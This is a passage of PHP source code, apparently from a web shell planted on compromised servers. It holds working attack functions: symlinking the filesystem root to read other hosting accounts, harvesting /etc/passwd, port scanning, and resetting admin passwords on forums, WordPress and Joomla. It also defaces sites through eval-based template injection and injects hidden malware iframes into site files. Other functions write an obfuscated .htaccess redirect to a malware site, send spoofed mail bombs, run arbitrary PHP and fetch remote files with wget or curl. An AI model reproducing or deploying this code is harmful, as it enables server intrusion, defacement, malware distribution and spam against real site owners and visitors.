		echo "<table align=center border=1 style='width:60%;border-color:#333333;'><tr align =center><td align=center><font size=3 >S. No.</font></td><td align=center><font size=3 >Domains</font></td><td align=center><font size=3 >Users</font></td><td align=center><font size=3 >Symlink</font></td><td align=center><font size=3 >Information</font></td></tr>";
				
		$dcount = 1;
		foreach($d0mains as $d0main)
		{
			if(eregi("zone",$d0main))
			{
				preg_match_all('#zone "(.*)"#', $d0main, $domains);
				flush();
					
				if(strlen(trim($domains[1][0])) > 2)
				{ 
					$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
						
					echo "<tr align=center><td><font class=txt>" . $dcount . "</font></td><td align=left><a href=http://www.".$domains[1][0]."/><font class=txt>".$domains[1][0]."</font></a></td><td><font class=txt>".$user['name']."</font></td><td><a href=".$url."dhanush/root/home/".$user['name']."/public_html target='_blank'><font class=txt>Symlink</font></a></td><td><font class=txt><a href=?info=".$domains[1][0]." target=_blank>info</a></font></td></tr>"; flush();
					$dcount++;
				}
			}
			
		}
		echo "</table>";
	}
	else
	{
		if(stristr(php_uname(),"Linux"))
		{
			?>
			<div style="float:left;position:fixed;">
			<form>
			<table cellpadding="9">
				<tr>
					<th colspan="2">Get User Name</th>
				</tr>
				<tr>
					<td>Enter Website Name :</td>
					<td><input type="text" name="sitename" value="sitename.com" class="sbox"></td>
				</tr>
				<tr>
					<td align="center" colspan="2"><input type="button" onClick="getname(sitename.value)" value="   Get IT  " class="but"></td>
				</tr>
				<tr>
					<td colspan=2 align=center><div style="width:250px;" id="showsite"></div></td>
				</tr>
			</table>
			</form>
			</div>
			<?php
			$TEST=@file('/etc/passwd');
			if ($TEST) 
			{
				@mkdir("dhanush",0777);
				@chdir("dhanush");
				execmd("ln -s / root");
				$file3 = 'Options all 
				 DirectoryIndex Sux.html 
				 AddType text/plain .php 
				 AddHandler server-parsed .php 
				  AddType text/plain .html 
				 AddHandler txt .html 
				 Require None 
				 Satisfy Any        
				';
				$fp3 = fopen('.htaccess','w');
				$fw3 = fwrite($fp3,$file3);
				@fclose($fp3);
							
				echo "<table align=center border=1 style='width:40%;border-color:#333333;'><tr><td align=center><font size=4 >S. No.</font></td><td align=center><font size=4 >Users</font></td><td align=center><font size=3 >Symlink</font></td></tr>";
						
				$dcount = 1;
				$file = fopen("/etc/passwd", "r");
				//Output a line of the file until the end is reached
				while(!feof($file))
				{
					$s = fgets($file);
					$matches = array();
					$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
					$matches = str_replace("home/","",$matches[1]);
					if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
						continue;
					echo "<tr><td align=center><font size=3 class=txt>" . $dcount . "</td><td align=center><font size=3 class=txt>" . $matches . "</td>";
					echo "<td align=center><font size=3 class=txt><a href=".$url."dhanush/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
					$dcount++;
				}
				fclose($file);
						
				echo "</table>";
			}
			else
			{
				@mkdir("dhanush",0777);
				@chdir("dhanush");
				execmd("ln -s / root");
				$file3 = 'Options all 
				 DirectoryIndex Sux.html 
				 AddType text/plain .php 
				 AddHandler server-parsed .php 
				  AddType text/plain .html 
				 AddHandler txt .html 
				 Require None 
				 Satisfy Any        
				';
				$fp3 = fopen('.htaccess','w');
				$fw3 = fwrite($fp3,$file3);
				@fclose($fp3);
				
				echo "<table align=center border=1 style='width:40%;border-color:#333333;'><tr><td align=center><font size=4 >S. No.</font></td><td align=center><font size=4 >Users</font></td><td align=center><font size=3 >Symlink</font></td></tr>";
						
				$temp = "";
				$val1 = 0;
				$val2 = 1000;
				for(;$val1 <= $val2;$val1++) 
				{
					$uid = @posix_getpwuid($val1);
					if ($uid)
					 $temp .= join(':',$uid)."\n";
				 }
				 echo '<br/>';
				 $temp = trim($temp);
				 
				 $file5 = fopen("test.txt","w");
				 fputs($file5,$temp);
				 fclose($file5);
					 
				 $dcount = 1;
				 $file = fopen("test.txt", "r");
				 while(!feof($file))
				 {
					$s = fgets($file);
					$matches = array();
					$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
					$matches = str_replace("home/","",$matches[1]);
					if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
						continue;
					echo "<tr><td align=center><font size=3 class=txt>" . $dcount . "</td><td align=center><font size=3 class=txt>" . $matches . "</td>";
					echo "<td align=center><font size=3 class=txt><a href=".$url."dhanush/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
					$dcount++;
				 }
					fclose($file);
					echo "</table>";
					unlink("test.txt");
			}
		}
		else
			echo "<center><font size=4 >Cannot create Symlink</font></center>";
	}
}
else if(isset($_GET['host']) && isset($_GET['protocol']))
{
	echo "Open Ports: ";
	$host = $_GET['host'];
	$proto = $_GET['protocol'];
	$myports = array("21","22","23","25","59","80","113","135","445","1025","5000","5900","6660","6661","6662","6663","6665","6666","6667","6668","6669","7000","8080","8018");
	for($current = 0; $current <= 23; $current++)
	{
		$currents = $myports[$current];
		$service = getservbyport($currents, $proto);
		// Try to connect to port
		$result = fsockopen($host, $currents, $errno, $errstr, 1);
		// Show results
		if($result)
			echo "<font class=txt>$currents, </font>";
	}
}
else if(isset($_REQUEST['forumpass']))
{
		$localhost =  $_GET['f1']; 
		$database =  $_GET['f2']; 
		$username =  $_GET['f3']; 
		$password =  $_GET['f4']; 
		$prefix    =  $_GET['prefix'];
		$newpass = $_GET['newpass'];
		$uid = $_GET['uid'];
		
		if($_GET['forums'] == "vb")
		{	
			$newpass = $_GET['newipbpass'];
			$uid = $_GET['ipbuid'];
			$con = mysql_connect($localhost,$username,$password);
			$db = mysql_select_db($database,$con);
			$salt = "eghjghrtd";
			$newpassword = md5(md5($newpass) . $salt);
			if($prefix == "" || $prefix == null)
				$sql = mysql_query("update user set password = '$newpassword', salt = '$salt' where userid = '$uid'");
			else
				$sql = mysql_query("update ".$prefix."user set password = '$newpassword', salt = '$salt' where userid = '$uid'");
			if($sql)
			{
				mysql_close($con);
				echo "<font class=txt>Password Changed Successfully</font>";
			}
			else
				echo "Cannot Change Password";
		}
		else if($_GET['forums'] == "mybb")
		{	
			$newpass = $_GET['newipbpass'];
			$uid = $_GET['ipbuid'];
			$con = mysql_connect($localhost,$username,$password);
			$db = mysql_select_db($database,$con);
			$salt = "jeghj";
			$newpassword = md5(md5($salt).md5($newpass));
			if($prefix == "" || $prefix == null)
				$sql = mysql_query("update mybb_users set password = '$newpassword', salt = '$salt' where uid = '$uid'");
			else
				$sql = mysql_query("update ".$prefix."users set password = '$newpassword', salt = '$salt' where uid = '$uid'");
			if($sql)
			{
				mysql_close($con);
				echo "<font class=txt>Password Changed Successfully</font>";
			}
			else
				echo "Cannot Change Password";
		}
		else if($_GET['forums'] == "smf")
		{	
			$newpass = $_GET['newipbpass'];
			$uid = $_GET['ipbuid'];
			$con = mysql_connect($localhost,$username,$password);
			$db = mysql_select_db($database,$con);
							
			if($prefix == "" || $prefix == null)
			{
				$result = mysql_query("select member_name from smf_members where id_member = $uid");
				$row = mysql_fetch_array($result);
				$membername = $row['member_name'];
				$newpassword = sha1(strtolower($membername).$newpass);
				$sql = mysql_query("update smf_members set passwd = '$newpassword' where id_member = '$uid'");
			}
			else

			{
				$result = mysql_query("select member_name from ".$prefix."members where id_member = $uid");
				$row = mysql_fetch_array($result);
				$membername = $row['member_name'];
				$newpassword = sha1(strtolower($membername).$newpass);
				$sql = mysql_query("update ".$prefix."members set passwd = '$newpassword' where id_member = '$uid'");
			}
			if($sql)
			{
				mysql_close($con);
				echo "<font class=txt>Password Changed Successfully</font>";
			}
			else
				echo "Cannot Change Password";
		}
		else if($_GET['forums'] == "phpbb")
		{	
			$newpass = $_POST['newipbpass'];
			$uid = $_POST['ipbuid'];
			$con = mysql_connect($localhost,$username,$password);
			$db = mysql_select_db($database,$con);
			
			$newpassword = md5($newpass);
			if(empty($prefix) || $prefix == null)
				$sql = mysql_query("update phpb_users set user_password = '$newpassword' where user_id = '$uid'");
			else
				$sql = mysql_query("update ".$prefix."users set user_password = '$newpassword' where user_id = '$uid'");
			if($sql)
			{
				mysql_close($con);
				echo "<font class=txt>Password Changed Successfully</font>";
			}
			else
				echo "Cannot Change Password";
		}
		else if($_GET['forums'] == "ipb")
		{
			$newpass = $_POST['newipbpass'];
			$uid = $_POST['ipbuid'];
			$con = mysql_connect($localhost,$username,$password);
			$db = mysql_select_db($database,$con);
			$salt = "eghj";
			$newpassword = md5(md5($salt).md5($newpass));
			if($prefix == "" || $prefix == null)
				$sql = mysql_query("update members set members_pass_hash = '$newpassword', members_pass_salt = '$salt' where member_id = '$uid'");
			else
				$sql = mysql_query("update ".$prefix."members set members_pass_hash = '$newpassword', members_pass_salt = '$salt' where member_id = '$uid'");
			if($sql)
			{
				mysql_close($con);
				echo "<font class=txt>Password Changed Successfully</font>";
			}
			else
				echo "Cannot Change Password";
		}
		else if($_GET['forums'] == "wp")
		{	
			$uname = $_GET['uname'];
			$con = mysql_connect($localhost,$username,$password);
			$db = mysql_select_db($database,$con);

			$newpassword = md5($newpass);
			if($prefix == "" || $prefix == null)
				$sql = mysql_query("update wp_users set user_pass = '$newpassword', user_login = '$uname' where ID = '$uid'");
			else
				$sql = mysql_query("update ".$prefix."users set user_pass = '$newpassword', user_login = '$uname' where ID = '$uid'");
			if($sql)
			{
				mysql_close($con);
				echo "<font class=txt>Password Changed Successfully</font>";
			}
			else
				echo "Cannot Change Password";
		}
		else if($_GET['forums'] == "joomla")
		{	
			$newjoomlapass = $_GET['newjoomlapass'];
			$joomlauname = $_GET['username'];
			$con = mysql_connect($localhost,$username,$password);
			$db = mysql_select_db($database,$con);

			$newpassword = md5($newjoomlapass);
			if($prefix == "" || $prefix == null)
				$sql = mysql_query("update jos_users set password = '$newpassword', username = '$joomlauname' where name = 'Super User'");
			else
				$sql = mysql_query("update ".$prefix."users set password = '$newpassword', username = '$joomlauname' where name = 'Super User' OR name = 'Administrator'");
			if($sql)
			{
				mysql_close($con);
				echo "<font class=txt>Password Changed Successfully</font>";
			}
			else
				echo "Cannot Change Password";
		}
}
else if(isset($_POST['forumdeface']))
{
	$localhost =  $_POST['f1']; 
	$database =  $_POST['f2']; 
	$username =  $_POST['f3']; 
	$password =  $_POST['f4']; 
	$index    =  $_POST['index'];
	$prefix    =  $_POST['tableprefix'];
	
	if($_POST['forumdeface'] == "vb")
	{
		$con =@ mysql_connect($localhost,$username,$password); 
		$db =@ mysql_select_db($database,$con);  
		$index=str_replace('"','\\"',$index); 
		$attack  = "{\${eval(base64_decode(\'"; 
		$attack .= base64_encode("echo \"$index\";"); 
		$attack .= "\'))}}{\${exit()}}</textarea>"; 
		if($prefix == "" || $prefix == null)
				$query = "UPDATE template SET template = '$attack'"; 
		else
			$query = "UPDATE ".$prefix."template SET template = '$attack'"; 
		$result =@ mysql_query($query,$con); 
		if($result)
			echo "<center><font class=txt size=4><blink>Vbulletin Forum Defaced Successfully</blink></font></center>";
		else
			echo "<center><font  size=4><blink>Cannot Deface Vbulletin Forum</blink></font></center>";
	}
	else if($_POST['forumdeface'] == "mybb")
	{
		$con =@ mysql_connect($localhost,$username,$password); 
		$db =@ mysql_select_db($database,$con);  
		$attack  = "{\${eval(base64_decode(\'"; 
		$attack .= base64_encode("echo \"$index\";"); 
		$attack .= "\'))}}{\${exit()}}</textarea>"; 
		$attack  = str_replace('"',"\\'",$attack);
			
		if($prefix == "" || $prefix == null)
			$query = "UPDATE mybb_templates SET template = '$attack'"; 
		else
		$query = "UPDATE ".$prefix."templates SET template = '$attack'"; 
		$result =@ mysql_query($query,$con);
		if($result)
			echo "<center><font class=txt size=4><blink>Mybb Forum Defaced Successfully</blink></font></center>";
		else
			echo "<center><font  size=4><blink>Cannot Deface Mybb Forum</blink></font></center>";
	}
	else if($_POST['forumdeface'] == "smf")
	{
		$head    =  $_POST['head'];
		$catid    =  $_POST['f5'];
						
		$con =@ mysql_connect($localhost,$username,$password); 
		$db =@ mysql_select_db($database,$con);  
		if($prefix == "" || $prefix == null)
			$query = "UPDATE boards SET name='$head', description='$index' WHERE id_cat='$catid'"; 
		else
			$query = "UPDATE ".$prefix."boards SET name='$head', description='$index' WHERE id_cat='$catid'"; 
		$result =@ mysql_query($query,$con);
		if($result)
			echo "<center><font class=txt size=4><blink>SMF Forum Index Changed Successfully</blink></font></center>";
		else
			echo "<center><font  size=4><blink>Cannot Deface SMF Forum</blink></font></center>";
	}
	else if($_POST['forumdeface'] == "ipb")
	{
		$head    =  $_POST['head'];
		$catid    =  $_POST['f5'];
							
		$IPB = "forums";
		$con =@ mysql_connect($localhost,$username,$password); 
		$db =@ mysql_select_db($database,$con);
		if($prefix == "" || $prefix == null)
			$result =@mysql_query($query = "UPDATE $IPB SET name = '$head', description = '$index' where id = '$catid'"); 
		else
			$result =@mysql_query($query = "UPDATE $prefix.$IPB SET name = '$head', description = '$index' where id = '$catid'");
		if($result)
			echo "<center><font class=txt size=4><blink>Forum Defaced Successfully</blink></font></center>";
		else
			echo "<center><font  size=4><blink>Cannot Deface Forum</blink></font></center>";
	}
	else if($_POST['forumdeface'] == "wp")
	{
		$catid = $_POST['f5'];
		$head    =  $_POST['head'];
				
		$con =@ mysql_connect($localhost,$username,$password); 
		$db =@ mysql_select_db($database,$con);  
		if($prefix == "" || $prefix == null)
		{
			if(isset($_POST["alll"]) && $_POST["alll"] == "All")
				$query = "UPDATE wp_posts SET post_title='$head', post_content='$index'"; 
			else
				$query = "UPDATE wp_posts SET post_title='$head', post_content='$index' WHERE ID='$catid'"; 
		}
		else
		{
			if(isset($_POST["alll"]) && $_POST["alll"] == "All")
				$query = "UPDATE ".$prefix."posts SET post_title='$head', post_content='$index'";
			else
				$query = "UPDATE ".$prefix."posts SET post_title='$head', post_content='$index' WHERE ID='$catid'";
					
		}
		$result =@mysql_query($query,$con) or mysql_error();
		if($result)
			echo "<center><font class=txt size=4><blink>Wordpress Defaced Successfully</blink></font></center>";
		else
			echo "<center><font  size=4><blink>Cannot Deface Wordpress</blink></font></center>";
	}
	else if($_POST['forumdeface'] == "joomla")
	{
		$site_url = $_POST['siteurl'];
		$dbprefix = $_POST['tableprefix'];
		$dbname =  $_POST['f2']; 
		$h="<? echo(stripslashes(base64_decode('".urlencode(base64_encode(str_replace("'","'",($_POST['index']))))."'))); exit; ?>";
		
		function randomt() 
		{ 
			$chars = "abcdefghijkmnopqrstuvwxyz023456789"; 
			srand((double)microtime()*1000000); 
			$i = 0; 
			$pass = '' ; 
					
			while ($i <= 7) 
			{ 
				$num = rand() % 33; 
				$tmp = substr($chars, $num, 1); 
				$pass = $pass . $tmp; 
				$i++; 
			} 
					
			return $pass; 
		}
		function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1)
		{
			$ar0=explode($marqueurDebutLien, $text);
			$ar1=explode($marqueurFinLien, $ar0[$i]);
			$ar=trim($ar1[0]);
			return $ar;
		}
		$co=randomt();
					
		$link=mysql_connect($localhost,$username,$password) ;
		mysql_select_db($dbname,$link);
				
	    $tryChaningInfo = mysql_query("UPDATE ".$dbprefix."users SET username ='admin' , password = '2a9336f7666f9f474b7a8f67b48de527:DiWqRBR1thTQa2SvBsDqsUENrKOmZtAX'");
											 
		$req =mysql_query("SELECT * from  `".$dbprefix."extensions` ");
						 
		if ( $req )
		{
			$req =mysql_query("SELECT * from  `".$dbprefix."template_styles` WHERE client_id='0' and home='1'");
			$data = mysql_fetch_array($req);
			$template_name=$data["template"];
			
			$req =mysql_query("SELECT * from  `".$dbprefix."extensions` WHERE name='".$template_name."'");
			 $data = mysql_fetch_array($req);
			$template_id=$data["extension_id"];
						
			$url2=$site_url."/index.php";
			
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $url2);
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
			curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
			curl_setopt($ch, CURLOPT_HEADER, 1);
			curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
			curl_setopt($ch, CURLOPT_COOKIEJAR, $co); 
			curl_setopt($ch, CURLOPT_COOKIEFILE, $co); 
			
				
			$buffer = curl_exec($ch);
				
			$return=entre2v2($buffer ,'<input type="hidden" name="return" value="','"');
			$hidden=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',4);
			
				
			$url2=$site_url."/index.php";
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $url2);
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS,"username=admin&passwd=123456789&option=com_login&task=login&return=".$return."&".$hidden."=1");
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
			curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
			curl_setopt($ch, CURLOPT_COOKIEJAR, $co); 
			curl_setopt($ch, CURLOPT_COOKIEFILE, $co); 
			$buffer = curl_exec($ch);
						
			$pos = strpos($buffer,"com_config");
			if($pos === false) 
			{
				echo("<br>[-] Login Error");
				exit;
			}
										
			$url2=$site_url."/index.php?option=com_templates&task=source.edit&id=".base64_encode($template_id.":index.php");
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $url2);
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
			curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
			curl_setopt($ch, CURLOPT_COOKIEJAR, $co); 

			curl_setopt($ch, CURLOPT_COOKIEFILE, $co); 
			$buffer = curl_exec($ch);
				
			$hidden2=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',2);
			if(!$hidden2) 
			{
				echo("<br>[-] index.php Not found in Theme Editor");
				exit;
			}
						
			$url2=$site_url."/index.php?option=com_templates&layout=edit";
						
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $url2);
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS,"jform[source]=".$h."&jform[filename]=index.php&jform[extension_id]=".$template_id."&".$hidden2."=1&task=source.save");
						
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
			curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
			curl_setopt($ch, CURLOPT_COOKIEJAR, $co); 
			curl_setopt($ch, CURLOPT_COOKIEFILE, $co); 
			$buffer = curl_exec($ch);
				
			$pos = strpos($buffer,'<dd class="message message">');
			if($pos === false) 
			{
				echo("<center><font  size=4><blink>Cannot Deface Joomla</blink></font></center>");
			}
			else 
			{
				echo("<center><font class=txt size=4><blink>Joomla Defaced Successfully</blink></font></center>");
			}
		}
		else
		{
			$req =mysql_query("SELECT * from  `".$dbprefix."templates_menu` WHERE client_id='0'");
			$data = mysql_fetch_array($req);
			$template_name=$data["template"];
				
			$url2=$site_url."/index.php";
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $url2);
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
			curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
			curl_setopt($ch, CURLOPT_HEADER, 1);
			curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
			curl_setopt($ch, CURLOPT_COOKIEJAR, $co); 
			curl_setopt($ch, CURLOPT_COOKIEFILE, $co); 
			$buffer = curl_exec($ch);
						
			$hidden=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',3);
				
			$url2=$site_url."/index.php";
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $url2);
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS,"username=admin&passwd=123456789&option=com_login&task=login&".$hidden."=1");
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
			curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
			curl_setopt($ch, CURLOPT_COOKIEJAR, $co); 
			curl_setopt($ch, CURLOPT_COOKIEFILE, $co); 
			$buffer = curl_exec($ch);
						
			$pos = strpos($buffer,"com_config");
	
			if($pos === false) 
			{
				echo("<br>[-] Login Error");
				exit;
			}
										
			$url2=$site_url."/index.php?option=com_templates&task=edit_source&client=0&id=".$template_name;
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $url2);
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
			curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
			curl_setopt($ch, CURLOPT_COOKIEJAR, $co); 
			curl_setopt($ch, CURLOPT_COOKIEFILE, $co); 
			$buffer = curl_exec($ch);
						
			$hidden2=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',6);
				
			if(!$hidden2) 
			{
				echo("<br>[-] index.php Not found in Theme Editor");
			}
				
			$url2=$site_url."/index.php?option=com_templates&layout=edit";
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $url2);
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS,"filecontent=".$h."&id=".$template_name."&cid[]=".$template_name."&".$hidden2."=1&task=save_source&client=0");
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
			curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
			curl_setopt($ch, CURLOPT_COOKIEJAR, $co); 
			curl_setopt($ch, CURLOPT_COOKIEFILE, $co); 
			$buffer = curl_exec($ch);
						
			$pos = strpos($buffer,'<dd class="message message fade">');
			if($pos === false) 
			{
				echo("<center><font  size=4><blink>Cannot Deface Joomla</blink></font></center>");
				exit;
			}
			else 
			{
				echo("<center><font class=txt size=4><blink>Joomla Defaced Successfully</blink></font></center>");
			}
		}
	}
}
else if(isset($_POST['pathtomass']) &&  $_POST['pathtomass'] != '' &&  isset($_POST['filetype']) &&  $_POST['filetype'] != '' &&  isset($_POST['mode']) &&  $_POST['mode'] != '' && isset($_POST['injectthis']) &&  $_POST['injectthis'] != '')
{
    $filetype = $_POST['filetype'];
    
    $mode = "a"; 
            
    if($_POST['mode'] == 'Apender')
         $mode = "a";
   
    if($_POST['mode'] == 'Overwriter')
         $mode = "w";
        
   	if (is_dir($_POST['pathtomass'])) 
	{
		$lolinject = $_POST['injectthis'];
		$mypath = $_POST['pathtomass'] .$directorysperator. "*.".$filetype;
		if(substr($_POST['pathtomass'], -1) == "\\")
			$mypath = $_POST['pathtomass'] . "*.".$filetype;
		foreach (glob($mypath) as $injectj00) 
		{
			if($injectj00 == __FILE__)
				continue;
			$fp=fopen($injectj00,$mode);
			if (fputs($fp,$lolinject))
				echo '<br><font class=txt size=3>'.$injectj00.' was injected<br></font>';
			else
				echo 'failed to inject '.$injectj00.'<br>';
		}
	}
	else 
		echo '<b>'.$_POST['pathtomass'].' is not available!</b>';
}
else if(isset($_POST['mailfunction']))
{
	if($_POST['mailfunction'] == "dobombing")
	{
		if(isset($_POST['to']) && isset($_POST['subject']) && isset($_POST['message']) && isset($_POST['times']) && $_POST['to'] != '' && $_POST['subject'] != '' && 			$_POST['message'] != '' && $_POST['times'] != '')
		{
			$times = $_POST['times'];
			while($times--)
			{
				if(isset($_POST['padding']))
				{
					$fromPadd = rand(0,9999);
					$subjectPadd = " -- ID : ".rand(0,9999999);
					$messagePadd = "\n\n------------------------------\n".rand(0,99999999);
					
				}
				$from = "president$fromPadd@whitehouse.gov";
				if(!mail($_POST['to'],$_POST['subject'].$subjectPadd,$_POST['message'].$messagePadd,"From:".$from))
				{
					$error = 1;
					echo "<center><font  size=3><blink><blink>Some Error Occured!</blink></font></center>";
					break;
				}
			}
			if($error != 1)
				echo "<center><font class=txt size=3><blink>Mail(s) Sent!</blink></font></center>";
		}
	}
	else if($_POST['mailfunction'] == "massmailing")
	{
		if(isset($_POST['to']) &&  isset($_POST['from']) &&  isset($_POST['subject']) && isset($_POST['message']))
		{
   			if(mail($_POST['to'],$_POST['subject'],$_POST['message'],"From:".$_POST['from']))
        	    echo "<center><font class=txt size=3><blink>Mail Sent!</blink></font></center>";
        	else
        	    echo "<center><font  size=3><blink>Some Error Occured!</blink></font></center>";
		}
	}
}
else if(isset($_POST['code']))
{
	if($_POST['code'] != null && isset($_POST['intext']) && $_POST['intext'] == "true")
	{
		// FIlter Some Chars we dont need
		?><br>
		<textarea name="code" class="box" cols="120" rows="10"><?php 
		$code = str_replace("<?php","",$_POST['code']);
		$code = str_replace("<?","",$code);
		$code = str_replace("?>","",$code);
	
		// Evaluate PHP CoDE!
		htmlspecialchars(eval($code));
		?>
		</textarea><?php 
	}
	else if($_POST['code'] != null && $_POST['intext'] == "false")
	{
		$code = str_replace("<?php","",$_POST['code']);
		$code = str_replace("<?","",$code);
		$code = str_replace("?>","",$code);

		// Evaluate PHP CoDE!
		?><br><font  size="4">Result of execution this PHP-code :</font><br><font class=txt><?php htmlspecialchars(eval($code)); ?></font><?php
	}
}
else if(isset($_GET['infect']))
{
	$coun = 0;
	$str = "<iframe width=0px height=0px frameborder=no name=frame1 src=".$malsite."> </iframe>";
	foreach (glob($_GET['path'] . "*.php") as $injectj00) 
    {
		if($injectj00 == __FILE__)
			continue;
	    if($myfile=fopen($injectj00,'a'))
	    {
			fputs($myfile, $str);
			fclose($myfile);
			$coun = 1;
	    }
    }
    foreach (glob($_GET['path'] . $directorysperator . "*.htm") as $injectj00) 
    {
	   if($myfile=fopen($injectj00,'a'))
	   {	
	    	fputs($myfile, $str);
		fclose($myfile);
		$coun = 1;
	   }
	}
	foreach (glob($_GET['path'] . $directorysperator . "*.html") as $injectj00) 
	{
		if($myfile=fopen($injectj00,'a'))
		{
			 fputs($myfile, $str);
			 fclose($myfile);
			 $coun = 1;
		}
	 }
				 

	if($coun == 1)
		echo "<center>Done !!!!<center>";
	else
		echo "<center>Cannot open files !!!!<center>";
}
else if(isset($_GET['redirect']))
{
	if($myfile = fopen(".htaccess",'a'))
	{
		$mal = "eNqV0UtrAjEQAOC70P8wYHsRyRa8FYpQSR9QXAmCBxHJrkMSjDNhk/pA/O+uFuyx5javj4GZLrzJj68xzLhZTRqM8aGjcNe4hJKMI4SSbpUyJMcUwZHFNr/VR0wreDp+TqeTpZLvUkl1AtHTcS1q3ojeI8zHo36pFv8Jw2w8ZoBNpMuK+0HlyOQJ77aYJzT7TOCT3rqYdB7Dfd0280xE3dRWHLRl/lV/RP14bEfAphReisJ4rrQPvGt/TcboZK8BXy9eOBLBhiG9Dp5hrvrfizOeH7rw";
		fwrite($myfile, gzuncompress(base64_decode($mal)));
		fwrite($myfile, "\n\r");
		fclose($myfile);
		echo "<center>Done !!!!<center>";
	}
	else
		echo "<center>Cannot open file !!!!<center>";
}
else if(isset($_GET['malware']))
{ ?>
	<input type="hidden" id="malpath" value="<?php echo $_GET["dir"]; ?>">
	<center><table><tr><td><a href=# onClick="malwarefun('infect')"><font class=txt size="4">| Infect Users |</font></a></td>
	<td><a href=javascript:void(0) onClick="malwarefun('redirect')"><font class=txt size="4">| Redirect Search Engine TO Malwared site |</font></a></td></tr></table></center>
	<div id="showmal"></div>
	<?php
}	
else if(isset($_GET['codeinsert']))
{
	if($file1 = fopen(".htaccess",'r'))
	{
	?><div id="showcode"></div>
	<form method=post>
	<textarea rows=9 cols=110 name="code" class=box><?php while(!feof($file1)) { echo fgets($file1); } ?></textarea><br>
	<input type="button" onClick="codeinsert(code.value)" value="  Insert  " class=but>
	</form>
	<?php }
	else
		echo "<center>Cannot Open File!!</center>";
}
else if(isset($_POST['getcode'])) 
{
	 if($myfile = fopen(".htaccess",'a'))
	{
		fwrite($myfile, $_POST['getcode']);
		fwrite($myfile, "\n\r");
		fclose($myfile);
		echo "<font class=txt>Code Inserted Successfully!!!!</font>";
	}
	else
		echo "Permission Denied";
}
else if(isset($_GET['uploadurl']))
{
	$functiontype = trim($_GET['functiontype']); 
	$wurl = trim($_GET['wurl']); 
	$path = magicboom($_GET['path']); 
	
	function remotedownload($cmd,$url)
	{ 
		$namafile = basename($url); 
		switch($cmd) 
		{ 
			case 'wwget': 
				execmd(which('wget')." ".$url." -O ".$namafile);
				break; 
			case 'wlynx': 
				execmd(which('lynx')." -source ".$url." > ".$namafile);
				break; 
			case 'wfread' : 
				execmd($wurl,$namafile);
				break; 
			case 'wfetch' : 
				execmd(which('fetch')." -o ".$namafile." -p ".$url);
				break; 
			case 'wlinks' : 
				execmd(which('links')." -source ".$url." > ".$namafile);
				break; 
			case 'wget' : 
				execmd(which('GET')." ".$url." > ".$namafile);
				break; 
			case 'wcurl' : 
				execmd(which('curl')." ".$url." -o ".$namafile);
				break; 
			default: 
			break; 
		} 
		return $namafile; 
	}
	$namafile = remotedownload($functiontype,$wurl); 
	$fullpath = $path . $directorysperator . $namafile;
	if(is_file($fullpath)) 
	{ 
